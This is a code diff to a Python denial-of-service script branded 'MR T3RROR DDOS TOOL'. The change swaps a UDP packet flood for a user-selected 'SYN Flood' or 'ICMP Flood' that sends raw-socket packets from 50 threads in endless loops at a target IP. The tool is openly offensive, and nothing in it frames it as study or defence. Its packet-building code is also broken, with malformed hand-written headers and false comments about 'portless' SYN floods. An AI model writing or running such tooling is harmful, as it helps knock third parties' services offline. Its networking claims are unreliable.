@@ -14,7 +14,7 @@ def print_logo():
     print("\033[92m")
     print("   ╔════════════════════════════════╗")
     print("   ║    MR T3RROR DDOS TOOL         ║")
-    print("   ║ CIVILIAN CYBER EXPERT FORCE ║")
+    print("   ║  CIVILIAN CYBER EXPERT FORCE  ║")
     print("   ╚════════════════════════════════╝")
     print("\n")
 
@@ -52,16 +52,13 @@ def get_target_details():
     print("   ╚══════════════════════════════════════════╝")
     while True:
         try:
-            url = input("\n   ➤ Enter Target Website URL: ")
-            ip = input("   ➤ Enter Target IP Address: ")
-            port = int(input("   ➤ Enter Target Port Number: "))
-            if not (1 <= port <= 65535):
-                raise ValueError("Port number must be between 1 and 65535.")
+            ip = input("\n   ➤ Enter Target IP Address: ")
+            # Not asking for a port because it's a portless attack (SYN or ICMP flood)
             break
         except ValueError as e:
             print(f"   ❌ Error: {e}. Please enter valid values.")
     print("\n   ✅ Details received successfully.\n")
-    return url, ip, port
+    return ip
 
 def print_ddos_banner():
     print("\033[96m")
@@ -71,25 +68,34 @@ def print_ddos_banner():
     print("   ╚══════════════════════════════════════════╝")
     print("\n")
 
-def send_packet(sock, ip, port, packet_size):
-    """Function to send a single packet with random data"""
-    bytes = random._urandom(packet_size)  # Larger packet size
-    sock.sendto(bytes, (ip, port))
+def send_syn_packet(sock, ip):
+    """Function to send a SYN packet (no port specified, just targeting IP layer)"""
+    # Create a fake IP header (without specific ports)
+    ip_header = b'\x45\x00\x00\x3c\x1c\x46\x40\x00\x40\x06\xb1\xe6'  # Fake TCP/IP header
+    sock.sendto(ip_header, (ip, 0))  # SYN packet without specific port
 
-def flood_attack(ip, port, packet_size, threads_count):
-    """Function to perform a flooding attack with threading for parallel execution"""
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+def send_icmp_packet(sock, ip):
+    """Function to send ICMP (ping) packets"""
+    icmp_header = b'\x08\x00\x7f\x00\x00\x00'  # Fake ICMP Echo request packet
+    sock.sendto(icmp_header, (ip, 0))  # ICMP packet without port specification
+
+def flood_attack(ip, attack_type, threads_count):
+    """Function to perform a flooding attack without a specified port"""
+    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)  # Raw socket for ICMP
     sock.settimeout(2)
-    print(f"\n   🚀 DDoS Attack started on {ip} through port {port}")
-    logging.info(f"DDoS Attack started on {ip} through port {port}")
+    print(f"\n   🚀 {attack_type} Attack started on {ip}")
+    logging.info(f"{attack_type} Attack started on {ip}")
 
     # Threaded attack
     def attack_thread():
         packet_count = 0
         while True:
-            send_packet(sock, ip, port, packet_size)
+            if attack_type == "SYN Flood":
+                send_syn_packet(sock, ip)  # Sending SYN packet
+            elif attack_type == "ICMP Flood":
+                send_icmp_packet(sock, ip)  # Sending ICMP (ping) packet
             packet_count += 1
-            print(f"\033[35m   ➤ Sent packet #{packet_count} to {ip} on port {port}")
+            print(f"\033[35m   ➤ Sent packet #{packet_count} to {ip}")
 
     # Creating multiple threads for parallel packet sending
     threads = []
@@ -107,13 +113,18 @@ def main():
     if login():
         print_ddos_banner()
         loading_bar()
-        url, ip, port = get_target_details()
+        ip = get_target_details()
 
         # Set custom parameters for stronger attack
-        packet_size = 5000  # Increase packet size to 5000 bytes (Can be adjusted further)
         threads_count = 50  # Use 50 threads for a stronger attack
 
-        flood_attack(ip, port, packet_size, threads_count)
+        # Choose attack type (SYN Flood or ICMP Flood)
+        attack_type = input("\n   ➤ Choose Attack Type (SYN Flood/ICMP Flood): ").strip()
+        if attack_type not in ["SYN Flood", "ICMP Flood"]:
+            print("\n   ❌ Invalid attack type! Choose either 'SYN Flood' or 'ICMP Flood'.")
+            exit()
+
+        flood_attack(ip, attack_type, threads_count)
     else:
         print("\033[91m   ❌ Access Denied! Please try logging in again.")
 
